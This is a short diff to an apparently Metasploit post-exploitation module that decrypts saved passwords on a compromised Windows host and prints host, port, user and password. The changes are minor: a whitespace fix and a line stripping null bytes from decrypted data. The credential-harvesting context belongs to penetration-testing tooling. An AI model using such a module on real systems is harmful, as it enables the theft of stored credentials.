@@ -110,7 +110,7 @@ class Metasploit3 < Msf::Post
 
 			next if epassword.empty?
 
-			pass = decrypt(epassword)			
+			pass = decrypt(epassword)
 
 			print_good("HOST: #{host} PORT: #{port} USER: #{user} PASS: #{pass}")
 			report_auth_info(
@@ -143,7 +143,7 @@ class Metasploit3 < Msf::Post
 		releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)	
 
 		data = decrypted['pbData']
-
+		data.gsub!(/[\x00]/, '')
 		return data
 	end
 end
